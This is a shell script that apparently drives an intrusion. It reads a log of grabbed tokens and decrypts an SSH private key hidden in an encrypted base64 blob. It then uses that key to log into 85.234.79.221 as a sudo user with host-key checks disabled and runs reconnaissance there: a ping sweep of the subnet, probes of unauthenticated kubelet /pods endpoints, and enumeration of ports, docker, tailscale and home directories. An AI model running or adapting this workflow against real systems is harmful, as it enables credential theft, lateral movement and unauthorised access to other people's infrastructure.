echo "=== tokgrab log ==="
tail -30 /root/snoop/tokgrab.log 2>/dev/null
ls -la /root/snoop/tg_*.json 2>/dev/null | head -20
echo "=== k221 delivery v2 ==="
P=$(tr -d '[:space:]' < /root/.rxk | sha256sum | awk '{print $1}')
cat > /tmp/.k221.b64 <<'K64'
U2FsdGVkX19hDB94RDecB0Uov4X30GnJiKWpJEsHPnAGNGlQHEqzOV5smXLnfr7MTr1lS5HL9sH9
czm7yh1PeuLxrIHckUUbWCWKC216W5WEuJlScoCFVg+gpyqYbleymf6gzKV3EpZ9Q7sMRjcAmeNU
e6KClB+1e9WmH2HKgPk+hc2aXtpNOl48WMdANew1Js9q5aVJtg3MRWHYVvEM9AhQtF4VEa/lsu8e
CnNZ9CS1tXfsiZauxdbhYv3TCq9Ai/POOmM6ensTBaJ7tWLOCqmlEztnTqoJlQbIuiQKbHN+ToAr
2si8dPvdOLghBMvBQP1ZlCFkz3+XMCjk7s8pqMblxv3N0CQyy2NZkWmQQLcSERs5HMqYw+y5n7pp
hSvrSTaNAHII/oJe8aS8nAoPL3KyHOhxwNc+Jixe79gbqPiP9mr3CJeGWQoIzJrSarsTLpqh1kQN
eInsTx9Z8ThnM8/1iYrUf+DgJHSWjRlaocHXyEox2sf2S+UfPMmzrEYZeR8o282kK9zO4DQzufAN
xLZ0Nh3fh9helULoITz5JrcTwW7Sr+UWiAMxYxr7HimKjXpgWW3WYUCwm5cFCqaQcg==
K64
openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$P -in /tmp/.k221.b64 -out /tmp/.k221 2>/dev/null && chmod 600 /tmp/.k221 && head -1 /tmp/.k221 || echo "DECRYPT-FAIL2"
echo "=== 221 recon ==="
cat > /tmp/recon221.sh <<'RSH'
#!/bin/bash
echo "=== id ==="; id; sudo -n true 2>&1 && echo SUDO-OK
echo "=== ip addr ==="; ip -brief addr
echo "=== ip neigh ==="; ip neigh
echo "=== ping-sweep ==="; for i in $(seq 1 254); do (ping -c1 -W1 85.234.79.$i >/dev/null 2>&1 && echo "85.234.79.$i up") & done; wait
echo "=== neigh after ==="; ip neigh | grep -v FAILED | head -40
echo "=== kubelet probes ==="
for ip in 31 87 103 109 184 233; do
  for path in /healthz /pods; do
    code=$(curl -sk --max-time 4 "https://85.234.79.$ip:10250$path" -o /tmp/kube-$ip$(echo $path|tr / _) -w "%{http_code}")
    echo "  85.234.79.$ip:10250$path -> $code ($(wc -c < /tmp/kube-$ip$(echo $path|tr / _) 2>/dev/null) bytes)"
  done
done
echo "=== pods bodies (first 400 chars each) ==="
for ip in 31 87 103 109 184 233; do echo "-- $ip --"; head -c 400 /tmp/kube-$ip_pods 2>/dev/null; echo; done
echo "=== tailnet ==="; (command -v tailscale && tailscale status 2>&1 | head -8); ip link show tailscale0 2>&1 | head -2
echo "=== listening ==="; ss -tlnp 2>/dev/null | head -25
echo "=== docker ==="; docker ps 2>/dev/null | head -12
echo "=== homes ==="; ls /home/
RSH
chmod +x /tmp/recon221.sh
if [ -s /tmp/.k221 ]; then
  timeout 100 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/recon221.sh 2>&1 | head -150
else
  echo "no key, skip"
fi
echo "=== B14DONE ==="
